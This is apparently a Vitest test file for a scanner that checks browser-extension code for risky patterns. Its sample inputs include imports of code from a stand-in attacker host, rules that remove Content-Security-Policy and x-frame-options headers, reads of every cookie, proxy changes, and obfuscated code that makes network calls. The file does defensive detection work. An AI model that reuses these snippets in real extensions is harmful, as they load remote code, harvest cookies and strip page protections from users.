import { strToU8 } from 'fflate';
import { describe, expect, it } from 'vitest';
import { analyseCode, OBFUSCATED_NAMES } from './code';

function run(scripts: Record<string, string>, ruleFiles: string[] = []) {
  const files = new Map(Object.entries(scripts).map(([k, v]) => [k, strToU8(v)]));
  return analyseCode(files, ruleFiles);
}

const labels = (r: ReturnType<typeof run>) => r.code.findings().map((f) => f.label);

describe('code built from data', () => {
  it('flags eval and new Function with dynamic arguments', () => {
    const r = run({ 'a.js': 'const s = getCode();\nnew Function("a", s)();\neval(s);' });
    expect(r.code.findings()).toEqual([
      { rule: 'built-code', points: 15, label: 'Code built from data', where: ['a.js:2', 'a.js:3'] },
    ]);
  });

  it('skips literal polyfills such as new Function("return this")', () => {
    const r = run({ 'a.js': 'var g = new Function("return this")(); Function("");' });
    expect(labels(r)).toEqual([]);
  });

  it('ignores eval mentioned inside strings and comments', () => {
    expect(labels(run({ 'a.js': '// eval(x)\nconst t = "eval(x)";' }))).toEqual([]);
  });

  it('flags dynamic code passed to tabs.executeScript', () => {
    expect(labels(run({ 'bg.js': 'chrome.tabs.executeScript(1, { code: payload });' }))).toEqual(['Code built from data']);
  });
});

describe('browser control', () => {
  it('flags turning off extensions and setting a proxy, even in minified aliases', () => {
    const r = run({ 'sw.js': 'e.management.setEnabled(t,!1);chrome.proxy.settings.set({value:{mode:"fixed_servers"}})' });
    expect(labels(r)).toEqual(['Turns off extensions', 'Sets the proxy']);
  });

  it('flags reading every cookie but not a scoped read', () => {
    expect(labels(run({ 'a.js': 'chrome.cookies.getAll({}, cb)' }))).toEqual(['Reads all cookies']);
    expect(labels(run({ 'a.js': 'chrome.cookies.getAll({ domain: "x.com" }, cb)' }))).toEqual([]);
  });

  it('flags blocking header listeners', () => {
    const r = run({ 'a.js': 'chrome.webRequest.onHeadersReceived.addListener(f, {urls:["<all_urls>"]}, ["blocking","responseHeaders"])' });
    expect(labels(r)).toEqual(['Rewrites headers']);
  });
});

describe('hard fails', () => {
  it('fails remote imports and importScripts', () => {
    expect(run({ 'a.js': 'import("https://evil.example/x.js")' }).hardFails[0]?.label).toBe('Runs code it downloads');
    expect(run({ 'a.js': 'importScripts("https://evil.example/x.js")' }).hardFails[0]?.label).toBe('Runs code it downloads');
  });

  it('fails injecting a remote script tag', () => {
    const r = run({ 'a.js': 'const s = document.createElement("script"); s.src = "https://cdn.example/x.js"; document.head.append(s);' });
    expect(r.hardFails.map((f) => f.rule)).toEqual(['remote-code']);
  });

  it('does not fail a local script tag', () => {
    expect(run({ 'a.js': 'const s = document.createElement("script"); s.src = chrome.runtime.getURL("x.js");' }).hardFails).toEqual([]);
  });

  it('fails dynamic rules and rule files that strip page security headers', () => {
    const js = run({ 'a.js': 'chrome.declarativeNetRequest.updateDynamicRules({addRules:[{id:1,action:{type:"modifyHeaders",responseHeaders:[{header:"Content-Security-Policy",operation:"remove"}]}}]})' });
    expect(js.hardFails[0]?.label).toBe('Strips page security headers');
    const json = run({ 'rules.json': '[{"id":1,"action":{"type":"modifyHeaders","responseHeaders":[{"header":"x-frame-options","operation":"remove"}]}}]' }, ['rules.json']);
    expect(json.hardFails[0]?.detail).toBe('Removes x-frame-options in rules.json.');
  });

  it('scores obfuscation, and fails it with network calls', () => {
    const names = Array.from({ length: OBFUSCATED_NAMES }, (_, i) => `var _0x${(0xa000 + i).toString(16)} = ${i};`).join('\n');
    const quiet = run({ 'o.js': names });
    expect(labels(quiet)).toEqual(['Obfuscated code']);
    expect(quiet.hardFails).toEqual([]);
    const noisy = run({ 'o.js': `${names}\nvar k = ["fetch"]; window[k[0]]("https://x")` });
    expect(noisy.hardFails[0]?.label).toBe('Obfuscated code with network calls');
  });
});

describe('other findings', () => {
  it('flags live secrets in strings', () => {
    const r = run({ 'a.js': 'const k = "AKIAABCDEFGHIJKLMNOP";' });
    expect(r.code.findings()[0]).toMatchObject({ label: 'Live secret in code', where: ['AWS access key at a.js:1'] });
  });

  it('flags binary code and counts unreadable scripts', () => {
    const r = run({ 'x.wasm': '\0asm', 'bad.js': 'function (' });
    expect(labels(r)).toEqual(['Binary code']);
    expect(r.unreadable).toEqual(['bad.js']);
    expect(r.scripts).toBe(1);
  });
});
